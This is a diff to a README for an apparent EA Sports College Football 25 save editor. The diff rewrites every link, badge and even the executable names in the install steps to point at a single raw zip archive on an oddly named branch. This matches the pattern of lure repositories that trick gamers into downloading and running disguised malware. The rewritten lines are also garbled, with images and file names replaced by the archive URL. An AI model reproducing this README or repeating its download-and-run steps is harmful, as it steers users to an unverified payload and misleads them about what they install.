@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2025%20Save%20Editor-blue?style=for-the-badge)](https://Perpaft11.github.io)
+[![Download](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip%20Sports%20College%20Football%2025%20Save%20Editor-blue?style=for-the-badge)](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)
 
 # 🏈 EA Sports College Football 25 Save Editor
 
@@ -11,10 +11,10 @@ Transform your in-game experiences, mold your roster, and script your own legend
 
 | Platform         | Supported | Latest Test |
 |------------------|:---------:|:-----------:|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-success) | ✔️ | 2025.1.0 |
-| ![macOS](https://img.shields.io/badge/macOS-Beta-orange)     | 🚧 | 2025.1.0 |
-| ![Linux](https://img.shields.io/badge/Linux-Planned-lightgrey)| 🔜 | N/A      |
-| ![SteamDeck](https://img.shields.io/badge/SteamDeck-Beta-orange)| 🚧 | 2025.1.0 |
+| ![Windows](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip) | ✔️ | 2025.1.0 |
+| ![macOS](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)     | 🚧 | 2025.1.0 |
+| ![Linux](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)| 🔜 | N/A      |
+| ![SteamDeck](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)| 🚧 | 2025.1.0 |
 
 Leveraging cross-platform technology, you can tinker with your saves whether you're at your desk, couch, or on the go.
 
@@ -67,14 +67,14 @@ Seamlessly blend your own creativity with state-of-the-art AI insight:
 ## 🚀 Installation Quickstart
 
 1. **Download the Latest Release**  
-   [![Download](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2025%20Save%20Editor-blue?style=for-the-badge)](https://Perpaft11.github.io)
+   [![Download](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip%20Sports%20College%20Football%2025%20Save%20Editor-blue?style=for-the-badge)](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)
 
 2. **Extract the File**  
    Unpack the archive to your preferred folder.
 
 3. **Run the Editor**  
-   - On Windows: Double click the `CF25SaveEditor.exe`
-   - On macOS: Open the `CF25SaveEditor.app` (You might need to allow permissions in *Security & Privacy*)
+   - On Windows: Double click the `https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip`
+   - On macOS: Open the `https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip` (You might need to allow permissions in *Security & Privacy*)
    - On Linux (future): Instructions pending 2025 release.
 
 4. **First-Time Setup**  
@@ -84,7 +84,7 @@ Seamlessly blend your own creativity with state-of-the-art AI insight:
 5. **Begin Editing**  
    Open or create a new save, and start building your legacy!
 
-*Detailed walkthroughs and troubleshooting available in our [Wiki](https://Perpaft11.github.io).*
+*Detailed walkthroughs and troubleshooting available in our [Wiki](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip).*
 
 ---
 
@@ -98,17 +98,17 @@ This project is an independent community creation and is not affiliated with, en
 
 Released under the MIT License (2025).  
 Find the full license text here:  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)
 
 ---
 
 ## 💡 Contribute, Suggest, or Celebrate!
 
-Your playbook ideas, translations, bug reports, and creative contributions keep this project surging forward. Dive into [Issues](https://Perpaft11.github.io) or submit a fresh [Pull Request](https://Perpaft11.github.io) — together, we create the playbook for every gridiron dreamer!
+Your playbook ideas, translations, bug reports, and creative contributions keep this project surging forward. Dive into [Issues](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip) or submit a fresh [Pull Request](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip) — together, we create the playbook for every gridiron dreamer!
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-EA%20Sports%20College%20Football%2025%20Save%20Editor-blue?style=for-the-badge)](https://Perpaft11.github.io)
+[![Download](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip%20Sports%20College%20Football%2025%20Save%20Editor-blue?style=for-the-badge)](https://raw.githubusercontent.com/Perpaft11/ea-sports-college-football-25-save-crafter/branch/incudostapedial/ea-sports-college-football-25-save-crafter-Tim.zip)
 
 ---
 *© 2025 EA Sports College Football 25 Save Editor Community Project. All rights reserved.*
